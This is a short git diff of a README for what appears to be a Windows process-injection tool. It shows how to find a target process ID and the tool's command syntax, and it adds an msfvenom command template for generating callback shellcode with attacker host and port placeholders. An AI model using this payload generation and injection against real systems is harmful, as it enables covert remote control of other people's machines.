@@ -35,7 +35,6 @@ Hackers usually use less suspicious or more important system processes such as: 
 ```bash
   tasklist | findstr <process name>
 ```
-
 => CMD syntax: `Process_injection.exe <PID>`
 
 # Compiling
@@ -69,3 +68,6 @@ sudo pacman -S mingw-w64-gcc
 ```
 
 => More Info: https://www.mingw-w64.org/
+
+=> Shellcode generator: `msfvenom -p <Payload> LHOST=<IP> LPORT=<LOCAL PORT> --platform windows --arch <x64/x86> -f c`
+
